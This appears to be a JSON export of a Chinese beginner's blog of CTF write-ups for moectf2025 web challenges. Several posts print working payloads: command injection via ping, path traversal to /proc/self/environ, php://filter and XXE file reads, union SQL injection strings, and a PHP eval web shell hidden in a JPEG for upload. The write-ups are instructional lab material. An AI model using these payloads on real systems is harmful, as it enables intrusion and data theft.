{"posts":[{"title":"0 web入门指北","text":"这是一篇纯新手向的文章，用来介绍我从一个零基础新手到可以初步解题的全过程。写这个web入门指北的目的是希望可以让和我一样原本对计算机一窍不通的人也可以入门网络安全这个方向。 接下来我将通过 moectf2025 中 Web 向试题来引入，我将主要从如何开始、如何搜集信息、如何利用 AI 工具这几个方面来开启这篇文章。 注： 关于平台的注册与连接方面的内容需要自己尝试一下，题目连接详见西电平台知识中的题目连接指南。这是最初的一步，切忌畏难和怕麻烦心理，进步要在前进的每一小步中慢慢体现。 1. 如何开始现在 moectf2025 已经告一段落，在“训练”的赛事一栏中便可以找到。随后我们来到“Web安全与渗透测试”，点击“0 web入门指北”，你将会在里面看到附件和题目信息。 附件中有一个专业的入门指北，你们也可以初步审阅，不过可能内容对纯新人来讲会很晦涩，可以跟着我，有一定的经验后再去阅读，相信你会有一些新的收获。 首先打开其中一个题目附件后你会看到一堆括号，同时给了一个提示：“你知道什么是控制台吗？快去了解一下吧！” 看到这里我们肯定会想要去浏览器上搜索一下控制台是什么，但是直接搜索的结果可能会让人眼前一黑，有种摸不着头脑的感觉。 这个时候就要引入我想讲的后两个内容：如何搜集信息和如何利用ai。 ###2.如何搜集信息使用搜索引擎有一定的技巧，首先如果可以尽量不要使用百度的搜索，百度搜索中的广告覆盖和信息混乱的情况比较严重，尽量可以使用Google或是bing（推荐），在浏览器中改一下搜索引擎即可，然后搜索方面，控制台可以涵盖的范围很大，我们可以加一些关键词，比如说CTF 控制台，这样便可以较好的锁定到相关信息，相信通过搜索你已经获得了信息，控制台指的是浏览器中开发者工具中的其中一个，可以用来运行javascript代码，或者是进行一定的命令注入，我们用这道题演示一下，实际上那些一大串的括号类字符是JSFuck（可以用搜索引擎搜一下进行深入了解），仅通过使用{}[]!+来编写有效的Javascript代码（F12打开开发者工具后，例如火绒你就可以在调试器中看到.js的文件，里面的内容就是javascript代码），达到构建字母数字甚至调用函数的目的，所以这道题有两个解法。 解法一：将附件中的下面的jsfuck找一个专门的反混淆网站来解密。解法二：将jsfuck扔到控制台中运行（记得要在控制台中输入allow pasting），运行结果如图： ###3.如何利用ai搜索在这个ai大受欢迎的年代，使用ai的能力不可或缺，deepseek，chatgpt，Gemini，Claude等ai都是相当好用的工具，这道题同样可以使用ai求解，你可以设置情景来询问ai，如你有一道CTF试题，题目提示是…，前端代码是（ctrl+U调出源码），后端代码为（如果题目附件给出），请给出详细的解题思路与步骤，跟着ai的引导相信你也可以完成这道试题，但是请记住ai可以辅助解题，但是一般不可能直接给出题目的答案，对ai生成的内容要带有批判精神，警惕ai幻觉。 ###总结总体上这是一篇针对一场比赛的入门指北，但我要提醒的是，其中涉及的对搜索引擎和ai的使用能里是可以普遍性的，务必牢记借助ai解出的题目，只有对知识消化吸收才能变为自己的，在比赛期间可以学的有些囫囵吞枣，但是赛后复盘一定要有思考的深度，感谢你的阅读。","link":"/2025/10/21/0-web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/"},{"title":"web-第一章","text":"这将是第一道正式的解题详解，首先我们先通过WSRX连好环境，然后再复制网址，开始做题。 如图： 我们尝试将附件内容复制过来，发现禁止粘贴，依旧F12，看一下shouzhuo.js中的前端代码，发现flag就在其中，得解，如图 通过阅读前端代码，我们发现其实这道题可以有其他解法，前端代码中禁用了粘贴，我们只需要在控制太输入命令将粘贴开放就好了document.addEventListener(‘paste’, e =&gt; e.stopPropagation(), true);这段Javascript代码通过提前捕获粘贴的信息使不被传递到禁止粘贴，来实现恢复粘贴，然后复制内容提交，如图：","link":"/2025/10/21/web-%E7%AC%AC%E4%B8%80%E7%AB%A0/"},{"title":"moyue的妙妙web学习指南","text":"你好，我是 moyue。 一个主攻 Web 方向的 CTF 新手。 相信很多计算机零基础的新手朋友会对信息安全这个东西一头雾水，所以鉴于此，我突发奇想：可不可以把我的入门经验记录下来呢。 于是我就搭了一个这样的神奇妙妙博客用来记录我的学习历程，之后更新的文章，会是 CTF 比赛的 Writeup，或是 Web 漏洞的一些总结。 希望你我都可以在博客中进步！","link":"/2025/10/19/moyue%E7%9A%84%E5%A6%99%E5%A6%99web%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/"},{"title":"web-第二章","text":"题目提示http抓包。使用burpsuit或者是yakit，这里推荐使用yakit页面好看这一块。在网上搜索相应的资源与使用教学便可开始使用。打开网页，有一段文字被糊住了，可以复制，复制下来，发现一个路由，我们通过抓包来访问。 已知抓包后发现flag在请求头里，我们也可以直接访问该路由，然后F12在网络中查找","link":"/2025/10/21/web-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"},{"title":"web-第七章","text":"通过阅读提示我们找到了文件robots.txt，该文件是一种协议规定搜索引擎可以访问哪些网站。在robots.txt中发现flag.php可以访问代码审计，一个简单的MD5，因为是弱比较，所以可以轻易绕过，原理为MD5加密后0e开头的数据不管后续内容是什么，在php比较中都是取0来进行比较，下附几个常用的值?a=QNKCDZO&amp;b=240610708240610708:0e462097431906509019562988736854QLTHNDT:0e405967825401955372549139051580QNKCDZO:0e830400451993494058024219903391PJNPDWY:0e291529052894702774557631701704NWWKITQ:0e763082070976038347657360817689NOOPCJF:0e818888003657176127862245791911MMHUWUV:0e701732711630150438129209816536MAUXXQC:0e478478466848439040434801845361IHKFRNS:0e256160682445802696926137988570GZECLQZ:0e537612333747236407713628225676GGHMVOE:0e362766013028313274586933780773GEGHBXL:0e248776895502908863709684713578EEIZDOI:0e782601363539291779881938479162DYAXWCA:0e424759758842488633464374063001DQWRASX:0e742373665639232907775599582643BRTKUJZ:00e57640477961333848717747276704ABJIHVY:0e755264355178451322893275696586aaaXXAYW:0e540853622400160407992788832284aabg7XSs:0e087386482136013740957780965295 加以扩展，如果是===强比较该怎么绕过，如$a != $bmd5($a) === md5($b)我们可以传入数组如，a[]=1&amp;b[]=2，使null===null 如果使用string强制转换又该如何操作(string)$a != (string)$bmd5($a) === md5($b)这里用到了md5强碰撞，两个不同的数据有相同的哈希值a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2 b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 还有 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2","link":"/2025/10/21/web-%E7%AC%AC%E4%B8%83%E7%AB%A0/"},{"title":"web-第九章","text":"这道题是一个ping，原理为ping www.baidu.com;ls，其中;为命令分隔符可以在执行过ping命令后，在执行一个命令来泄露信息通过www.baidu.com;env得解","link":"/2025/10/21/web-%E7%AC%AC%E4%B9%9D%E7%AB%A0/"},{"title":"web-第三章","text":"依旧HTTP请求包，这里我们需要对URL和POST传参的内容进行修改，得解如图：","link":"/2025/10/21/web-%E7%AC%AC%E4%B8%89%E7%AB%A0/"},{"title":"web-第五章","text":"一个简单的本地文件包含（LFI）和路径遍历，输入../../../../flag拿到flag，或者是../../../proc/self/environ查看环境变量。以下来讲一下路径遍历的原理，通过../跳到上一级目录来访问原本不能访问的内容，如果对参数缺乏验证通过此方法可以访问服务器上的敏感文件。","link":"/2025/10/21/web-%E7%AC%AC%E4%BA%94%E7%AB%A0/"},{"title":"web-第十一章","text":"根据题目提示需要进行传参，不过这个传参涉及120种可能，而且字母顺序一直在变化，我们可以通过传参所有可能来覆盖字母顺序以下是生成120种可能的python脚本： 123456import itertoolsletters = ['m', 'n', 'o', 'p', 'q']perms = [''.join(p) for p in itertools.permutations(letters)]query_string = '&amp;'.join(f&quot;{s}={s}&quot; for s in perms)print(query_string) payload: 1mnopq=mnopq&amp;mnoqp=mnoqp&amp;mnpoq=mnpoq&amp;mnpqo=mnpqo&amp;mnqop=mnqop&amp;mnqpo=mnqpo&amp;monpq=monpq&amp;monqp=monqp&amp;mopnq=mopnq&amp;mopqn=mopqn&amp;moqnp=moqnp&amp;moqpn=moqpn&amp;mpnoq=mpnoq&amp;mpnqo=mpnqo&amp;mponq=mponq&amp;mpoqn=mpoqn&amp;mpqno=mpqno&amp;mpqon=mpqon&amp;mqnop=mqnop&amp;mqnpo=mqnpo&amp;mqonp=mqonp&amp;mqopn=mqopn&amp;mqpno=mqpno&amp;mqpon=mqpon&amp;nmopq=nmopq&amp;nmoqp=nmoqp&amp;nmpoq=nmpoq&amp;nmpqo=nmpqo&amp;nmqop=nmqop&amp;nmqpo=nmqpo&amp;nompq=nompq&amp;nomqp=nomqp&amp;nopmq=nopmq&amp;nopqm=nopqm&amp;noqmp=noqmp&amp;noqpm=noqpm&amp;npmoq=npmoq&amp;npmqo=npmqo&amp;npomq=npomq&amp;npoqm=npoqm&amp;npqmo=npqmo&amp;npqom=npqom&amp;nqmop=nqmop&amp;nqmpo=nqmpo&amp;nqomp=nqomp&amp;nqopm=nqopm&amp;nqpmo=nqpmo&amp;nqpom=nqpom&amp;omnpq=omnpq&amp;omnqp=omnqp&amp;ompnq=ompnq&amp;ompqn=ompqn&amp;omqnp=omqnp&amp;omqpn=omqpn&amp;onmpq=onmpq&amp;onmqp=onmqp&amp;onpmq=onpmq&amp;onpqm=onpqm&amp;onqmp=onqmp&amp;onqpm=onqpm&amp;opmnq=opmnq&amp;opmqn=opmqn&amp;opnmq=opnmq&amp;opnqm=opnqm&amp;opqmn=opqmn&amp;opqnm=opqnm&amp;oqmnp=oqmnp&amp;oqmpn=oqmpn&amp;oqnmp=oqnmp&amp;oqnpm=oqnpm&amp;oqpmn=oqpmn&amp;oqpnm=oqpnm&amp;pmnoq=pmnoq&amp;pmnqo=pmnqo&amp;pmonq=pmonq&amp;pmoqn=pmoqn&amp;pmqno=pmqno&amp;pmqon=pmqon&amp;pnmoq=pnmoq&amp;pnmqo=pnmqo&amp;pnomq=pnomq&amp;pnoqm=pnoqm&amp;pnqmo=pnqmo&amp;pnqom=pnqom&amp;pomnq=pomnq&amp;pomqn=pomqn&amp;ponmq=ponmq&amp;ponqm=ponqm&amp;poqmn=poqmn&amp;poqnm=poqnm&amp;pqmno=pqmno&amp;pqmon=pqmon&amp;pqnmo=pqnmo&amp;pqnom=pqnom&amp;pqomn=pqomn&amp;pqonm=pqonm&amp;qmnop=qmnop&amp;qmnpo=qmnpo&amp;qmonp=qmonp&amp;qmopn=qmopn&amp;qmpno=qmpno&amp;qmpon=qmpon&amp;qnmop=qnmop&amp;qnmpo=qnmpo&amp;qnomp=qnomp&amp;qnopm=qnopm&amp;qnpmo=qnpmo&amp;qnpom=qnpom&amp;qomnp=qomnp&amp;qompn=qompn&amp;qonmp=qonmp&amp;qonpm=qonpm&amp;qopmn=qopmn&amp;qopnm=qopnm&amp;qpmno=qpmno&amp;qpmon=qpmon&amp;qpnmo=qpnmo&amp;qpnom=qpnom&amp;qpomn=qpomn&amp;qponm=qponm 成功传参后出现了一个文件查询的功能，但是对输出的文字数进行了限制，观察url，发现是本地文件包含，使用php封装流将flag.php以base64的形式取出，下附payload： 1php://filter/read=convert.base64-encode/resource=flag.php php://filter是一个元封装器，用于处理后续数据流进行筛选过滤，这是一个php伪协议，这里的convert.base64-encode是一个过滤器将flag.php的内容进行base64编码，然后输出。 除此之外我们可以引入几个其他的php伪协议，比如：data:// 数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。 1data://text/plain,&lt;?php%20phpinfo();?&gt; file:// 用于读取本地文件 1file:///etc/passsword","link":"/2025/10/22/web-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0/"},{"title":"web-第十二章","text":"这道题主要是学习蚁剑的使用，首先我们需要下载一个蚁剑具体操作可以学习网上专门的博客教程。打开蚁剑，连接一下，然后查找flag，简单浏览一下没有看到flag，我们右键打开终端浏览环境变量，输入命令env获得flag。","link":"/2025/10/23/web-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0/"},{"title":"web-第十三章","text":"创建JPEG文件头[byte[]]$bytes = 0xFF, 0xD8, 0xFFSet-Content -Path exploit.jpg -Value $bytes -Encoding Byte -NoNewline 添加PHP PayloadAdd-Content -Path exploit.jpg -Value ‘‘ -NoNewline 验证文件”文件大小: $((Get-Item exploit.jpg).Length) 字节”这里用到了一句话木马,可以使用以下脚本 123[byte[]]$bytes = 0xFF, 0xD8, 0xFFSet-Content -Path exploit.jpg -Value $bytes -Encoding Byte -NoNewlineAdd-Content -Path exploit.jpg -Value '&lt;?php @eval($_REQUEST[&quot;cmd&quot;]); ?&gt;' -NoNewline 在powershell中运行，获得一张图片然后使用yakit或者burpsuite来拦截请求，将图片的jpg形式修改为php,然后使用蚁剑连接在终端中打印环境变量，printenv得解。 该题目有也可以将eval改成SYSTEM，然后直接在URL中将图片存入的链接复制过来，然后访问，通过添加?cmd=（这里放命令）来执行命令。","link":"/2025/10/23/web-%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0/"},{"title":"web-第六章","text":"一个简单的sql注入万能密码，成功获得flag admin’ or 1=1#解释以下sql注入的原理，SELECT * FROM users WHERE username = ‘user1’ AND password = ‘password1’;这是一据正常的查询语句，当我们在username中输入admin’ – 就会把后面的密码注释掉，– ，–+，#使常见的注释符号，admin’ OR ‘1’=’1也可以成功绕过，如SELECT * FROM users WHERE username = ‘admin’ OR ‘1’=’1’ AND password = ‘anything’;当存在admin用户时这条语句返回正确，在mysql中and优先级高于or。","link":"/2025/10/21/web-%E7%AC%AC%E5%85%AD%E7%AB%A0/"},{"title":"web-第八章","text":"题目提示为联合注入，也就是union，union本质是mysql中的一个操作符，可以合并两个及以上的select语句对于SELECT * FROM users WHERE username = ‘user1’ AND password = ‘password1’;这样一个正常的select语句，用’闭合前内容，使用union可以达到再用一个select的效果，用来查找数据库中的内容。以下是具体尝试首先 ‘union select 1,2#发现显示为welcome 1然后可以’union select database(),2#爆出数据库为user‘union select group_concat(table_name) ,2 from information_schema.tables where table_schema=database()#爆出表名flag，user‘union select group_concat(column_name) ,2 from information_schema.columns where table_name=’flag’#爆出列名为value‘union select value ,2 from flag# 出解","link":"/2025/10/21/web-%E7%AC%AC%E5%85%AB%E7%AB%A0/"},{"title":"web-第十章","text":"随便输入一下，结果如图： 了解到格式为xml文件，考虑XXE 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 该句为XML声明 1&lt;!DOCTYPE 输出 [&lt;!ENTITY file SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag.txt&quot;&gt;]&gt; 引用外部DTD 1&lt;输出&gt;&amp;file;&lt;/输出&gt; 将文件以base64给出接下来解释详细操作，XML中DTD是什么，DTD是一个文件类型定义，有内部和外部两种，主要用处用来声明元素和属性，如 12345678&lt;!DOCTYPE note[&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt; 这是一个内部DTD，声明了文档的根元素是note，而&lt;!ELEMENT&gt;声明定义了note元素必须包含to、from、heading和body子元素。#PCDATA表示可解析的字符数据。 1&lt;!DOCTYPE 输出 [&lt;!ENTITY file SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag.txt&quot;&gt;]&gt; 这一段中，通过&lt;!DOCTYPE声明DTD开始，定义根元素名为输出，[表示内部子集开始，&lt;!ENTITY定义一个实体，file是实体名称，SYSTEM关键字，是外部实体类型声明，指示实体值来源于外部资源如（文件，URL），”php://filter/convert.base64-encode/resource=/flag.txt”（一个URI），在这个DTD中php://filter将会以web服务器进程身份进行，同时通过该协议并base64编码，&lt;输出&gt;&file;&lt;/输出&gt;&amp;引用file，输出编码内容payload如下： 123&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE 输出 [&lt;!ENTITY file SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.txt&quot;&gt;]&gt;&lt;输出&gt;&amp;file;&lt;/输出&gt;","link":"/2025/10/21/web-%E7%AC%AC%E5%8D%81%E7%AB%A0/"},{"title":"web-第十章re","text":"该题思路同第十章一个简单的XXE，payload如下： 123&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE 输出 [&lt;!ENTITY file SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag.txt&quot;&gt;]&gt;&lt;输出&gt;&amp;file;&lt;/输出&gt; 该payload相比原题仅多一个/，/flag.txt为绝对路径，寻找位于根目录下的flag.txt文件，而直接flag.txt表示相对路径，访问的是工作目录下的文件，类似结构如下： 12345/├── flag.txt # 系统级 Flag└── var/www/html/ ├── app.php # 解析 XML 的 PHP 文件 └── flag.txt # 应用级 Flag","link":"/2025/10/22/web-%E7%AC%AC%E5%8D%81%E7%AB%A0re/"},{"title":"web-第四章","text":"http请求的多种讲究首先第一关，一个简单的get传参，key=xdsec，如图： 第二关，简单的post传参， 12345678910111213141516171819POST /cloud_weaver HTTP/1.1Host: 127.0.0.1:28326Accept-Encoding: gzip, deflate, br, zstdsec-ch-ua-mobile: ?0Accept-Language: zh-CN,zh;q=0.9sec-ch-ua-platform: &quot;Windows&quot;Sec-Fetch-User: ?1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Mode: navigateCache-Control: max-age=0Upgrade-Insecure-Requests: 1Sec-Fetch-Site: same-originSec-Fetch-Dest: documentReferer: http://127.0.0.1:28326/stone_golemsec-ch-ua: &quot;Google Chrome&quot;;v=&quot;141&quot;, &quot;Not?A_Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;141&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencodeddeclaration=织云阁=第一 第三关，本地访问，需要用到X-Forwarded-For: 127.0.0.1，将该内容加进请求头中，在这里我介绍一下X-Forwarded-For是什么，这是一个HTTP扩展头部用于表示真实ip，127.0.0.1可以用于伪造本地请求。第四关伪造user-agent，user-agent:moe browser，以下我们了解一下user-agent代表什么，user-agent用于表示用户的操作系统，浏览器渲染引擎版本和浏览器版本在开头加上Mozilla/5.0，爬虫中有涉及伪造user-agent的应用。第五关Cookie:user=xt，验证身份，下面我们了解一下Cookie是什么，Cookie是一个保存在本地的小型文本文件，用于记录和缓存用户身份数据。第六关referer：http://panshi/entry，表示来源第七关PUT请求发送新生！","link":"/2025/10/21/web-%E7%AC%AC%E5%9B%9B%E7%AB%A0/"}],"tags":[{"name":"控制台","slug":"控制台","link":"/tags/%E6%8E%A7%E5%88%B6%E5%8F%B0/"},{"name":"web入门须知","slug":"web入门须知","link":"/tags/web%E5%85%A5%E9%97%A8%E9%A1%BB%E7%9F%A5/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"置顶","slug":"置顶","link":"/tags/%E7%BD%AE%E9%A1%B6/"},{"name":"md5","slug":"md5","link":"/tags/md5/"},{"name":"ping","slug":"ping","link":"/tags/ping/"},{"name":"路径遍历","slug":"路径遍历","link":"/tags/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"sql","slug":"sql","link":"/tags/sql/"},{"name":"联合注入","slug":"联合注入","link":"/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"},{"name":"XXE","slug":"XXE","link":"/tags/XXE/"},{"name":"http","slug":"http","link":"/tags/http/"}],"categories":[{"name":"CTF Writeup","slug":"CTF-Writeup","link":"/categories/CTF-Writeup/"},{"name":"随笔","slug":"随笔","link":"/categories/%E9%9A%8F%E7%AC%94/"},{"name":"2025 moectf","slug":"CTF-Writeup/2025-moectf","link":"/categories/CTF-Writeup/2025-moectf/"}],"pages":[]}